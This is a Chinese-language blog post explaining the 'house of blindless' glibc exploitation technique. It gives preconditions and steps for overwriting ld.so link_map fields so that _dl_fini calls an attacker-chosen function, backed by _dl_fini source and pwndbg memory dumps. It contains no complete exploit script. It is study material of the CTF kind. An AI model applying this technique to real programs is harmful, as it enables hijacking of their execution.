<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h1 data-content="1" id="13875714c1baff20cab5c5799d3f95b2">house of blindless</h1>
<h3 data-content="1" id="f2646043592395b9cda535ca1cfc64f9">前言</h3>
<blockquote>
<p>复现wm新学到的一种利用手法，实际和banana的利用有些相像</p>
</blockquote>
<h3 data-content="1" id="69dbace40e06a9490de9fcf255a40247"><strong>利用条件:</strong></h3>
<blockquote>
<ul>
<li>
<p>无泄露情况下可以通过偏移实现libc区域的任意写，能泄露情况下肯定不如直接打<code>exit_hook</code>​来得方便</p>
</li>
<li>
<p>程序可以结束(可显式触发<code>exit</code>​函数 或 主函数由<code>libc_start_main</code>​启动且可正常退出)，调用到<code>_dl_fini</code>​ 函数</p>
</li>
</ul>
</blockquote>
<h3 data-content="1" id="2c9f9c820f0df59a55d17757c8e26166"><strong>利用方法:</strong></h3>
<blockquote>
<ul>
<li>控制<code>_rtld_global+2312</code>​为rdi</li>
<li>低位覆盖使得<code>l-&gt;l_info[DT_FINI]</code>​指向<code>l-&gt;l_info[DT_INIT]-&gt;d_un.d_ptr</code>​(也可以选择其他<code>Elf64_Dyn</code>​类型的结构体)</li>
<li>控制<code>l_addr</code>​为<code>后门函数地址-l_info[DT_INIT]</code>​</li>
<li>控制<code>l-&gt;l_info[DT_FINI_ARRAY]</code>​为0</li>
<li>结束程序，调用<code>_dl_fini</code>​</li>
</ul>
</blockquote>
<p>另一种情况：</p>
<blockquote>
<p>当elf地址也可以被任意写的时候</p>
<p>我们直接修改<code>l-&gt;l_info[DT_FINI]</code>​即可</p>
</blockquote>
<p>‍</p>
<h3 data-content="1" id="eba7af79f545832caca2454981940399">源码分析：</h3>
<p>ld.so文件中存在<code>rtld_global</code>​指针指向<code>rtld_global</code>​结构体，该结构体中存在多个<code>_dl_ns</code>​ 结构体，存储着elf各段的符号结构体</p>
<div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="n">l</span><span class="o">-&gt;</span><span class="n">l_info</span><span class="p">[</span><span class="n">DT_FINI_ARRAY</span><span class="p">]</span> <span class="o">!=</span> <span class="n">NULL</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">ElfW</span><span class="p">(</span><span class="n">Addr</span><span class="p">)</span> <span class="o">*</span><span class="n">array</span> <span class="o">=</span>
    <span class="p">(</span><span class="n">ElfW</span><span class="p">(</span><span class="n">Addr</span><span class="p">)</span> <span class="o">*</span><span class="p">)</span> <span class="p">(</span><span class="n">l</span><span class="o">-&gt;</span><span class="n">l_addr</span>
            <span class="o">+</span> <span class="n">l</span><span class="o">-&gt;</span><span class="n">l_info</span><span class="p">[</span><span class="n">DT_FINI_ARRAY</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">d_un</span><span class="o">.</span><span class="n">d_ptr</span><span class="p">);</span>
    <span class="n">unsigned</span> <span class="nb">int</span> <span class="n">i</span> <span class="o">=</span> <span class="p">(</span><span class="n">l</span><span class="o">-&gt;</span><span class="n">l_info</span><span class="p">[</span><span class="n">DT_FINI_ARRAYSZ</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">d_un</span><span class="o">.</span><span class="n">d_val</span>
            <span class="o">/</span> <span class="n">sizeof</span> <span class="p">(</span><span class="n">ElfW</span><span class="p">(</span><span class="n">Addr</span><span class="p">)));</span>
    <span class="k">while</span> <span class="p">(</span><span class="n">i</span><span class="o">--</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">((</span><span class="n">fini_t</span><span class="p">)</span> <span class="n">array</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="p">();</span>
<span class="p">}</span>
    <span class="o">/*</span> <span class="n">Next</span> <span class="k">try</span> <span class="n">the</span> <span class="n">old</span><span class="o">-</span><span class="n">style</span> <span class="n">destructor</span><span class="o">.</span>  <span class="o">*/</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">l</span><span class="o">-&gt;</span><span class="n">l_info</span><span class="p">[</span><span class="n">DT_FINI</span><span class="p">]</span> <span class="o">!=</span> <span class="n">NULL</span><span class="p">)</span> 
        <span class="n">DL_CALL_DT_FINI</span> <span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="n">l</span><span class="o">-&gt;</span><span class="n">l_addr</span> <span class="o">+</span> <span class="n">l</span><span class="o">-&gt;</span><span class="n">l_info</span><span class="p">[</span><span class="n">DT_FINI</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">d_un</span><span class="o">.</span><span class="n">d_ptr</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>
<p>控制<code>l-&gt;l_info[DT_FINI_ARRAY]</code>​为0，避开上面的分支，来进入下面的分支</p>
<p>​<code>l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr</code>​</p>
<p><strong>_rtld_global</strong></p>
<div class="highlight"><pre><span></span><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">p</span> <span class="n">_rtld_global</span>
<span class="c1">#p _rtld_global._dl_ns[0]</span>
<span class="err">$</span><span class="mi">1</span> <span class="o">=</span> <span class="p">{</span>
  <span class="n">_dl_ns</span> <span class="o">=</span> <span class="p">{{</span>
      <span class="n">_ns_loaded</span> <span class="o">=</span> <span class="mh">0x7f36620c3190</span><span class="p">,</span>
      <span class="n">_ns_nloaded</span> <span class="o">=</span> <span class="mi">4</span><span class="p">,</span>
      <span class="n">_ns_main_searchlist</span> <span class="o">=</span> <span class="mh">0x7f36620c3450</span><span class="p">,</span>
      <span class="n">_ns_global_scope_alloc</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
      <span class="n">_ns_global_scope_pending_adds</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
      <span class="n">_ns_unique_sym_table</span> <span class="o">=</span> <span class="p">{</span>
        <span class="n">lock</span> <span class="o">=</span> <span class="p">{</span>
          <span class="n">mutex</span> <span class="o">=</span> <span class="p">{</span>
            <span class="n">__data</span> <span class="o">=</span> <span class="p">{</span>
              <span class="n">__lock</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
              <span class="n">__count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
              <span class="n">__owner</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
              <span class="n">__nusers</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
              <span class="n">__kind</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span>
              <span class="n">__spins</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
              <span class="n">__elision</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
              <span class="n">__list</span> <span class="o">=</span> <span class="p">{</span>
                <span class="n">__prev</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
                <span class="n">__next</span> <span class="o">=</span> <span class="mh">0x0</span>
              <span class="p">}</span>
            <span class="p">},</span>
            <span class="n">__size</span> <span class="o">=</span> <span class="s1">'</span><span class="se">\000</span><span class="s1">'</span> <span class="o">&lt;</span><span class="n">repeats</span> <span class="mi">16</span> <span class="n">times</span><span class="o">&gt;</span><span class="p">,</span> <span class="s2">"</span><span class="se">\001</span><span class="s2">"</span><span class="p">,</span> <span class="s1">'</span><span class="se">\000</span><span class="s1">'</span> <span class="o">&lt;</span><span class="n">repeats</span> <span class="mi">22</span> <span class="n">times</span><span class="o">&gt;</span><span class="p">,</span>
            <span class="n">__align</span> <span class="o">=</span> <span class="mi">0</span>
          <span class="p">}</span>
        <span class="p">},</span>
        <span class="n">entries</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
        <span class="n">size</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
        <span class="n">n_elements</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
        <span class="n">free</span> <span class="o">=</span> <span class="mh">0x0</span>
      <span class="p">},</span>
      <span class="n">_ns_debug</span> <span class="o">=</span> <span class="p">{</span>
        <span class="n">r_version</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
        <span class="n">r_map</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
        <span class="n">r_brk</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
        <span class="n">r_state</span> <span class="o">=</span> <span class="n">RT_CONSISTENT</span><span class="p">,</span>
        <span class="n">r_ldbase</span> <span class="o">=</span> <span class="mi">0</span>
      <span class="p">}</span>
    <span class="p">},</span> <span class="p">{</span>
      <span class="n">_ns_loaded</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
      <span class="n">_ns_nloaded</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
      <span class="n">_ns_main_searchlist</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
      <span class="n">_ns_global_scope_alloc</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
      <span class="n">_ns_global_scope_pending_adds</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
      <span class="n">_ns_unique_sym_table</span> <span class="o">=</span> <span class="p">{</span>
        <span class="n">lock</span> <span class="o">=</span> <span class="p">{</span>
          <span class="n">mutex</span> <span class="o">=</span> <span class="p">{</span>
            <span class="n">__data</span> <span class="o">=</span> <span class="p">{</span>
              <span class="n">__lock</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
              <span class="n">__count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
              <span class="n">__owner</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
              <span class="n">__nusers</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
              <span class="n">__kind</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
              <span class="n">__spins</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
              <span class="n">__elision</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
              <span class="n">__list</span> <span class="o">=</span> <span class="p">{</span>
                <span class="n">__prev</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
                <span class="n">__next</span> <span class="o">=</span> <span class="mh">0x0</span>
              <span class="p">}</span>
            <span class="p">},</span>
            <span class="n">__size</span> <span class="o">=</span> <span class="s1">'</span><span class="se">\000</span><span class="s1">'</span> <span class="o">&lt;</span><span class="n">repeats</span> <span class="mi">39</span> <span class="n">times</span><span class="o">&gt;</span><span class="p">,</span>
            <span class="n">__align</span> <span class="o">=</span> <span class="mi">0</span>
          <span class="p">}</span>
        <span class="p">},</span>
        <span class="n">entries</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
        <span class="n">size</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
        <span class="n">n_elements</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
        <span class="n">free</span> <span class="o">=</span> <span class="mh">0x0</span>
      <span class="p">},</span>
      <span class="n">_ns_debug</span> <span class="o">=</span> <span class="p">{</span>
        <span class="n">r_version</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
        <span class="n">r_map</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
        <span class="n">r_brk</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
        <span class="n">r_state</span> <span class="o">=</span> <span class="n">RT_CONSISTENT</span><span class="p">,</span>
        <span class="n">r_ldbase</span> <span class="o">=</span> <span class="mi">0</span>
      <span class="p">}</span>
    <span class="p">}</span> <span class="o">&lt;</span><span class="n">repeats</span> <span class="mi">15</span> <span class="n">times</span><span class="o">&gt;</span><span class="p">},</span>
  <span class="n">_dl_nns</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span>
  <span class="n">_dl_load_lock</span> <span class="o">=</span> <span class="p">{</span>
    <span class="n">mutex</span> <span class="o">=</span> <span class="p">{</span>
      <span class="n">__data</span> <span class="o">=</span> <span class="p">{</span>
        <span class="n">__lock</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
        <span class="n">__count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
        <span class="n">__owner</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
        <span class="n">__nusers</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
        <span class="n">__kind</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span>
        <span class="n">__spins</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
        <span class="n">__elision</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
        <span class="n">__list</span> <span class="o">=</span> <span class="p">{</span>
          <span class="n">__prev</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
          <span class="n">__next</span> <span class="o">=</span> <span class="mh">0x0</span>
        <span class="p">}</span>
      <span class="p">},</span>
      <span class="n">__size</span> <span class="o">=</span> <span class="s1">'</span><span class="se">\000</span><span class="s1">'</span> <span class="o">&lt;</span><span class="n">repeats</span> <span class="mi">16</span> <span class="n">times</span><span class="o">&gt;</span><span class="p">,</span> <span class="s2">"</span><span class="se">\001</span><span class="s2">"</span><span class="p">,</span> <span class="s1">'</span><span class="se">\000</span><span class="s1">'</span> <span class="o">&lt;</span><span class="n">repeats</span> <span class="mi">22</span> <span class="n">times</span><span class="o">&gt;</span><span class="p">,</span>
      <span class="n">__align</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="p">}</span>
  <span class="p">},</span>
  <span class="n">_dl_load_write_lock</span> <span class="o">=</span> <span class="p">{</span>
    <span class="n">mutex</span> <span class="o">=</span> <span class="p">{</span>
      <span class="n">__data</span> <span class="o">=</span> <span class="p">{</span>
        <span class="n">__lock</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
        <span class="n">__count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
        <span class="n">__owner</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
        <span class="n">__nusers</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
        <span class="n">__kind</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span>
        <span class="n">__spins</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
        <span class="n">__elision</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
        <span class="n">__list</span> <span class="o">=</span> <span class="p">{</span>
          <span class="n">__prev</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
          <span class="n">__next</span> <span class="o">=</span> <span class="mh">0x0</span>
        <span class="p">}</span>
      <span class="p">},</span>
      <span class="n">__size</span> <span class="o">=</span> <span class="s1">'</span><span class="se">\000</span><span class="s1">'</span> <span class="o">&lt;</span><span class="n">repeats</span> <span class="mi">16</span> <span class="n">times</span><span class="o">&gt;</span><span class="p">,</span> <span class="s2">"</span><span class="se">\001</span><span class="s2">"</span><span class="p">,</span> <span class="s1">'</span><span class="se">\000</span><span class="s1">'</span> <span class="o">&lt;</span><span class="n">repeats</span> <span class="mi">22</span> <span class="n">times</span><span class="o">&gt;</span><span class="p">,</span>
      <span class="n">__align</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="p">}</span>
  <span class="p">},</span>
  <span class="n">_dl_load_adds</span> <span class="o">=</span> <span class="mi">4</span><span class="p">,</span>
  <span class="n">_dl_initfirst</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
  <span class="n">_dl_profile_map</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
  <span class="n">_dl_num_relocations</span> <span class="o">=</span> <span class="mi">98</span><span class="p">,</span>
  <span class="n">_dl_num_cache_relocations</span> <span class="o">=</span> <span class="mi">3</span><span class="p">,</span>
  <span class="n">_dl_all_dirs</span> <span class="o">=</span> <span class="mh">0x7f36620c3cd0</span><span class="p">,</span>
  <span class="n">_dl_rtld_map</span> <span class="o">=</span> <span class="p">{</span>
    <span class="n">l_addr</span> <span class="o">=</span> <span class="mi">139871549734912</span><span class="p">,</span>
    <span class="n">l_name</span> <span class="o">=</span> <span class="mh">0x55ac4ada3318</span> <span class="s2">"/lib64/ld-linux-x86-64.so.2"</span><span class="p">,</span>
    <span class="n">l_ld</span> <span class="o">=</span> <span class="mh">0x7f36620c1e68</span><span class="p">,</span>
    <span class="n">l_next</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
    <span class="n">l_prev</span> <span class="o">=</span> <span class="mh">0x7f3662078000</span><span class="p">,</span>
    <span class="n">l_real</span> <span class="o">=</span> <span class="mh">0x7f36620c29e8</span> <span class="o">&lt;</span><span class="n">_rtld_global</span><span class="o">+</span><span class="mi">2440</span><span class="o">&gt;</span><span class="p">,</span>
    <span class="n">l_ns</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
    <span class="n">l_libname</span> <span class="o">=</span> <span class="mh">0x7f36620c3050</span> <span class="o">&lt;</span><span class="n">_dl_rtld_libname</span><span class="o">&gt;</span><span class="p">,</span>
    <span class="n">l_info</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x7f36620c1ee8</span><span class="p">,</span> <span class="mh">0x7f36620c1ed8</span><span class="p">,</span> <span class="mh">0x7f36620c1e78</span><span class="p">,</span> <span class="mh">0x7f36620c1e98</span><span class="p">,</span> <span class="mh">0x7f36620c1ea8</span><span class="p">,</span> <span class="mh">0x7f36620c1f18</span><span class="p">,</span> <span class="mh">0x7f36620c1f28</span><span class="p">,</span> <span class="mh">0x7f36620c1f38</span><span class="p">,</span> <span class="mh">0x7f36620c1eb8</span><span class="p">,</span> <span class="mh">0x7f36620c1ec8</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x7f36620c1e68</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x7f36620c1ef8</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x7f36620c1f08</span><span class="p">,</span> <span class="mh">0x0</span> <span class="o">&lt;</span><span class="n">repeats</span> <span class="mi">13</span> <span class="n">times</span><span class="o">&gt;</span><span class="p">,</span> <span class="mh">0x7f36620c1f58</span><span class="p">,</span> <span class="mh">0x7f36620c1f48</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x7f36620c1f78</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x7f36620c1f68</span><span class="p">,</span> <span class="mh">0x0</span> <span class="o">&lt;</span><span class="n">repeats</span> <span class="mi">25</span> <span class="n">times</span><span class="o">&gt;</span><span class="p">,</span> <span class="mh">0x7f36620c1e88</span><span class="p">},</span>
    <span class="n">l_phdr</span> <span class="o">=</span> <span class="mh">0x7f3662094040</span><span class="p">,</span>
    <span class="n">l_entry</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
    <span class="n">l_phnum</span> <span class="o">=</span> <span class="mi">11</span><span class="p">,</span>
    <span class="n">l_ldnum</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
    <span class="n">l_searchlist</span> <span class="o">=</span> <span class="p">{</span>
      <span class="n">r_list</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
      <span class="n">r_nlist</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="p">},</span>
    <span class="n">l_symbolic_searchlist</span> <span class="o">=</span> <span class="p">{</span>
      <span class="n">r_list</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
      <span class="n">r_nlist</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="p">},</span>
    <span class="n">l_loader</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
    <span class="n">l_versions</span> <span class="o">=</span> <span class="mh">0x7f3662078940</span><span class="p">,</span>
    <span class="n">l_nversions</span> <span class="o">=</span> <span class="mi">6</span><span class="p">,</span>
    <span class="n">l_nbuckets</span> <span class="o">=</span> <span class="mi">17</span><span class="p">,</span>
    <span class="n">l_gnu_bitmask_idxbits</span> <span class="o">=</span> <span class="mi">3</span><span class="p">,</span>
    <span class="n">l_gnu_shift</span> <span class="o">=</span> <span class="mi">8</span><span class="p">,</span>
    <span class="n">l_gnu_bitmask</span> <span class="o">=</span> <span class="mh">0x7f36620943d8</span><span class="p">,</span>
    <span class="p">{</span>
      <span class="n">l_gnu_buckets</span> <span class="o">=</span> <span class="mh">0x7f36620943f8</span><span class="p">,</span>
      <span class="n">l_chain</span> <span class="o">=</span> <span class="mh">0x7f36620943f8</span>
    <span class="p">},</span>
    <span class="o">......</span>
</pre></div>
<p><strong>_dl_rtld_map</strong></p>
<div class="highlight"><pre><span></span><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">p</span> <span class="o">*</span><span class="p">(</span><span class="n">struct</span> <span class="n">link_map</span><span class="o">*</span><span class="p">)</span> <span class="mh">0x00007f36620c3190</span>
<span class="err">$</span><span class="mi">7</span> <span class="o">=</span> <span class="p">{</span>
  <span class="n">l_addr</span> <span class="o">=</span> <span class="mi">94198478548992</span><span class="p">,</span>
  <span class="n">l_name</span> <span class="o">=</span> <span class="mh">0x7f36620c3730</span> <span class="s2">""</span><span class="p">,</span>
  <span class="n">l_ld</span> <span class="o">=</span> <span class="mh">0x55ac4ada6d98</span><span class="p">,</span>
  <span class="n">l_next</span> <span class="o">=</span> <span class="mh">0x7f36620c3740</span><span class="p">,</span>
  <span class="n">l_prev</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
  <span class="n">l_real</span> <span class="o">=</span> <span class="mh">0x7f36620c3190</span><span class="p">,</span>
  <span class="n">l_ns</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
  <span class="n">l_libname</span> <span class="o">=</span> <span class="mh">0x7f36620c3718</span><span class="p">,</span>
  <span class="n">l_info</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x55ac4ada6d98</span><span class="p">,</span> <span class="mh">0x55ac4ada6e78</span><span class="p">,</span> <span class="mh">0x55ac4ada6e68</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x55ac4ada6e18</span><span class="p">,</span> <span class="mh">0x55ac4ada6e28</span><span class="p">,</span> <span class="mh">0x55ac4ada6ea8</span><span class="p">,</span> <span class="mh">0x55ac4ada6eb8</span><span class="p">,</span> <span class="mh">0x55ac4ada6ec8</span><span class="p">,</span> <span class="mh">0x55ac4ada6e38</span><span class="p">,</span> <span class="mh">0x55ac4ada6e48</span><span class="p">,</span> <span class="mh">0x55ac4ada6da8</span><span class="p">,</span> <span class="mh">0x55ac4ada6db8</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x55ac4ada6e88</span><span class="p">,</span> <span class="mh">0x55ac4ada6e58</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x55ac4ada6e98</span><span class="p">,</span> <span class="mh">0x55ac4ada6ee8</span><span class="p">,</span> <span class="mh">0x55ac4ada6dc8</span><span class="p">,</span> <span class="mh">0x55ac4ada6de8</span><span class="p">,</span> <span class="mh">0x55ac4ada6dd8</span><span class="p">,</span> <span class="mh">0x55ac4ada6df8</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x55ac4ada6ed8</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x55ac4ada6f08</span><span class="p">,</span> <span class="mh">0x55ac4ada6ef8</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x55ac4ada6ee8</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x55ac4ada6f28</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x55ac4ada6f18</span><span class="p">,</span> <span class="mh">0x0</span> <span class="o">&lt;</span><span class="n">repeats</span> <span class="mi">25</span> <span class="n">times</span><span class="o">&gt;</span><span class="p">,</span> <span class="mh">0x55ac4ada6e08</span><span class="p">},</span>
  <span class="n">l_phdr</span> <span class="o">=</span> <span class="mh">0x55ac4ada3040</span><span class="p">,</span>
  <span class="n">l_entry</span> <span class="o">=</span> <span class="mi">94198478553376</span><span class="p">,</span>
  <span class="n">l_phnum</span> <span class="o">=</span> <span class="mi">13</span><span class="p">,</span>
  <span class="n">l_ldnum</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
  <span class="n">l_searchlist</span> <span class="o">=</span> <span class="p">{</span>
    <span class="n">r_list</span> <span class="o">=</span> <span class="mh">0x7f3662078520</span><span class="p">,</span>
    <span class="n">r_nlist</span> <span class="o">=</span> <span class="mi">3</span>
  <span class="p">},</span>
  <span class="n">l_symbolic_searchlist</span> <span class="o">=</span> <span class="p">{</span>
    <span class="n">r_list</span> <span class="o">=</span> <span class="mh">0x7f36620c3710</span><span class="p">,</span>
    <span class="n">r_nlist</span> <span class="o">=</span> <span class="mi">0</span>
  <span class="p">},</span>
  <span class="n">l_loader</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
  <span class="n">l_versions</span> <span class="o">=</span> <span class="mh">0x7f3662078540</span><span class="p">,</span>
  <span class="n">l_nversions</span> <span class="o">=</span> <span class="mi">4</span><span class="p">,</span>
  <span class="n">l_nbuckets</span> <span class="o">=</span> <span class="mi">2</span><span class="p">,</span>
  <span class="n">l_gnu_bitmask_idxbits</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
  <span class="n">l_gnu_shift</span> <span class="o">=</span> <span class="mi">6</span><span class="p">,</span>
  <span class="n">l_gnu_bitmask</span> <span class="o">=</span> <span class="mh">0x55ac4ada33b0</span><span class="p">,</span>
  <span class="p">{</span>
    <span class="n">l_gnu_buckets</span> <span class="o">=</span> <span class="mh">0x55ac4ada33b8</span><span class="p">,</span>
    <span class="n">l_chain</span> <span class="o">=</span> <span class="mh">0x55ac4ada33b8</span>
  <span class="p">},</span>
  <span class="p">{</span>
    <span class="n">l_gnu_chain_zero</span> <span class="o">=</span> <span class="mh">0x55ac4ada3390</span><span class="p">,</span>
    <span class="n">l_buckets</span> <span class="o">=</span> <span class="mh">0x55ac4ada3390</span>
  <span class="p">},</span>
  <span class="n">l_direct_opencount</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span>
  <span class="n">l_type</span> <span class="o">=</span> <span class="n">lt_executable</span><span class="p">,</span>
  <span class="n">l_relocated</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span>
  <span class="n">l_init_called</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span>
  <span class="n">l_global</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span>
  <span class="n">l_reserved</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
  <span class="n">l_phdr_allocated</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
  <span class="n">l_soname_added</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
  <span class="n">l_faked</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
  <span class="n">l_need_tls_init</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
  <span class="n">l_auditing</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
  <span class="n">l_audit_any_plt</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
  <span class="n">l_removed</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
  <span class="n">l_contiguous</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
  <span class="n">l_symbolic_in_local_scope</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
  <span class="n">l_free_initfini</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
  <span class="n">l_nodelete_active</span> <span class="o">=</span> <span class="n">false</span><span class="p">,</span>
  <span class="n">l_nodelete_pending</span> <span class="o">=</span> <span class="n">false</span><span class="p">,</span>
  <span class="n">l_cet</span> <span class="o">=</span> <span class="mi">7</span><span class="p">,</span>
  <span class="n">l_rpath_dirs</span> <span class="o">=</span> <span class="p">{</span>
    <span class="n">dirs</span> <span class="o">=</span> <span class="mh">0xffffffffffffffff</span><span class="p">,</span>
    <span class="n">malloced</span> <span class="o">=</span> <span class="mi">0</span>
  <span class="p">},</span>
  <span class="o">......</span>
</pre></div>
<p>​<code>l_addr</code>​处地址为<code>elf_base</code>​</p>
<p>​<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20230914100357-f70c96e4-52a2-1.png"/><br/>
​</p>
